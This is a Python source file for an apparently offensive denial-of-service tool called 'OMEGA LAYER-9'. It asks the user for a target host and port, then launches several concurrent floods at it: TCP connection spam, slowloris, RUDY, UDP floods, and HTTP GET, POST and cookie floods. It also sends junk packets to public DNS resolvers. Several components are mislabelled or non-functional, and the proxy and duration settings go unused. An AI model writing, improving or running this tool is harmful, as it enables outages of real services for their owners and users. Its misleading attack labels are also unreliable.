import asyncio
import random
import socket
import threading
import time
import ssl
import h2.connection
import urllib.parse
import os
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
init(autoreset=True)

LOGO = f"""
{Fore.RED}╔══════════════════════════════════════════════════╗
{Fore.RED}║  {Fore.CYAN}██╗     █████╗  █████╗ ███████╗██████╗  {Fore.RED}       ║
{Fore.RED}║  {Fore.CYAN}██║    ██╔══██╗██╔══██╗██╔════╝██╔══██╗{Fore.RED}       ║
{Fore.RED}║  {Fore.CYAN}██║ █╗ ███████║███████║█████╗  ██████╔╝{Fore.RED}       ║
{Fore.RED}║  {Fore.CYAN}██║███╗██╔══██║██╔══██║██╔══╝  ██╔══██╗{Fore.RED}       ║
{Fore.RED}║  {Fore.CYAN}╚███╔███╔╝██║  ██║██║  ██║███████╗██║  ██║{Fore.RED}       ║
{Fore.RED}║  {Fore.CYAN} ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED}       ║
{Fore.RED}║                                                  ║
{Fore.RED}║  {Fore.YELLOW}LAYER-9 ULTIMATE — 9 VECTORS LIVE{Fore.RED}             ║
{Fore.RED}║  {Fore.MAGENTA}SeniorAlfred — Maximum Performance{Fore.RED}           ║
{Fore.RED}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

PROXIES = []
if os.path.exists("proxies.txt"):
    with open("proxies.txt") as f:
        PROXIES = [line.strip() for line in f if line.strip() and ":" in line]

async def syn_flood(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect_ex((host, port))
            s.send(b"\x00" * 128)
            s.close()
        except:
            await asyncio.sleep(0.001)

async def slowloris(host, port):
    socks = []
    while len(socks) < 200:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 999999999\r\nX-a: ".encode())
            socks.append(s)
        except:
            await asyncio.sleep(1)
    while True:
        for s in socks[:]:
            try:
                s.send(b"X")
                await asyncio.sleep(15)
            except:
                socks.remove(s)

async def h2_rapid_reset(session, url):
    while True:
        try:
            async with session.get(url, ssl=False, timeout=5):
                pass
        except:
            await asyncio.sleep(0.01)

async def udp_storm(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    ports = [53, 123, 1900, 389, 3389]
    while True:
        for p in ports:
            try:
                sock.sendto(payload, (host, p))
            except:
                pass
        await asyncio.sleep(0.001)

async def get_flood(session, url):
    while True:
        try:
            async with session.get(url, headers={"Cache-Control": "no-cache"}):
                pass
        except:
            await asyncio.sleep(0.001)

async def post_bomb(session, url):
    data = "A" * 10240
    while True:
        try:
            async with session.post(url, data=data):
                pass
        except:
            await asyncio.sleep(0.01)

async def cookie_flood(session, url):
    while True:
        try:
            cookies = "; ".join([f"k{i}={random.randbytes(8).hex()}" for i in range(500)])
            async with session.get(url, headers={"Cookie": cookies}):
                pass
        except:
            await asyncio.sleep(0.05)

async def reflector(host):
    refs = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
    payload = b"\x00\x01\x00\x00" + random._urandom(48)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for r in refs:
            try:
                sock.sendto(payload, (r, 53))
            except:
                pass
        await asyncio.sleep(0.01)

def rudy(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1000000\r\n\r\n".encode())
            for _ in range(100):
                s.send(b"A")
                time.sleep(0.5)
            s.close()
        except:
            time.sleep(1)

def get_proxy():
    return random.choice(PROXIES) if PROXIES else None

async def omega_attack(target, port, duration):
    url = f"https://{target}" if not target.startswith("http") else target
    host = urllib.parse.urlparse(url).hostname

    connector = aiohttp.TCPConnector(limit=1500, ssl=False)
    timeout = aiohttp.ClientTimeout(total=10)
    proxy = f"http://{get_proxy()}" if PROXIES else None
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        print(f"{Fore.RED}[Ω] 9 attack vectors initialized — running at full capacity")
        tasks = [
            syn_flood(host, port),
            slowloris(host, port),
            h2_rapid_reset(session, url),
            udp_storm(host),
            get_flood(session, url),
            post_bomb(session, url),
            cookie_flood(session, url),
            reflector(host),
        ]
        threading.Thread(target=rudy, args=(host, port), daemon=True).start()
        await asyncio.gather(*tasks, return_exceptions=True)

def get_input():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(LOGO)
    target = input(f"{Fore.CYAN}└─> {Fore.WHITE}Target (IP/domain): {Fore.GREEN}").strip()
    port_input = input(f"{Fore.CYAN}└─> {Fore.WHITE}Port (default 443): {Fore.GREEN}").strip()
    port = int(port_input) if port_input.isdigit() else 443
    duration_input = input(f"{Fore.CYAN}└─> {Fore.WHITE}Duration (seconds): {Fore.GREEN}").strip()
    duration = int(duration_input) if duration_input.isdigit() else 3600
    return target, port, duration

if __name__ == "__main__":
    try:
        target, port, duration = get_input()
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║  {Fore.YELLOW}OMEGA LAYER-9 — Attack Launched{Fore.RED}                ║")
        print(f"{Fore.RED}║  {Fore.CYAN}Target : {target:<37}{Fore.RED}║")
        print(f"{Fore.RED}║  {Fore.CYAN}Port   : {port:<37}{Fore.RED}║")
        print(f"{Fore.RED}║  {Fore.CYAN}Time   : {duration}s{Fore.RED}                              ║")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════╝\n")
        asyncio.run(omega_attack(target, port, duration))
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[Ω] Stopped by user")
    except Exception as e:
        print(f"{Fore.RED}[Ω] Error: {e}")
